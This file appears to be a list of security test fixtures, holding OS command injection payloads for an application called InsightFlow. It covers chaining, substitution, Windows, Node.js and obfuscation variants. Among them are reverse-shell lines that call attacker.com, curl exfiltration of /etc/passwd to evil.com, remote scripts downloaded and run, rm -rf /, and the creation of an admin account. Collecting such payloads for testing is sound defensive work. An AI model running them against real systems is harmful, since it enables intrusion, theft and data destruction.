# OS Command Injection Payloads - InsightFlow Security Test Fixtures
# Format: one payload per line, # for comments

# Semicolon chaining
; ls
; whoami
; id
; pwd
; cat /etc/passwd
; cat /etc/shadow
; env
; printenv
; dir
; type C:\Windows\win.ini
; netstat -an
; ifconfig
; ipconfig
; systeminfo

# Pipe injection
| ls
| whoami
| cat /etc/passwd
| dir
| type C:\Windows\win.ini
| net user
| nc -e /bin/sh attacker.com 4444
| nc -e cmd.exe attacker.com 4444

# Backtick substitution
`ls`
`whoami`
`cat /etc/passwd`
`id`
`dir`
`echo hacked`

# Dollar sign substitution
$(cat /etc/passwd)
$(whoami)
$(id)
$(ls -la)
$(nc -e /bin/sh 10.0.0.1 4444)
$(curl http://evil.com/steal?data=$(cat /etc/passwd))

# Newline injection
directory\nwhoami
path\ncat /etc/passwd
file\nid

# Ampersand backgrounding
& whoami &
& ping -c 10 10.0.0.1 &
& nc -e /bin/sh attacker.com 4444 &

# Combined injection
; rm -rf / ; echo hacked
; wget http://evil.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh
$(curl -s http://evil.com/revshell.sh | bash)
`curl http://evil.com/revshell.sh | sh`

# Windows-specific
| dir C:\
| type C:\Windows\System32\drivers\etc\hosts
| net user /add hacker Password123!
| net localgroup Administrators hacker /add
| powershell -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
| cmd /c "echo hacked"
& rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";alert(1)&

# Node.js-specific injection
__proto__.polluted=true
constructor.constructor('return process')().env
require('child_process').execSync('whoami')
process.mainModule.require('child_process').execSync('id')

# Multi-command chaining
original && whoami
original || whoami
original | whoami
original ; whoami ; echo done
original & whoami &
original $(id)
original `id`

# Obfuscation
/???/c$?t /e???/p??sw??
c$?t /e???/p??sw??
${PATH:0:1}etc${PATH:0:1}passwd
cat${IFS}/etc${IFS}/passwd
who$@ami
who{}$ami
who$0ami
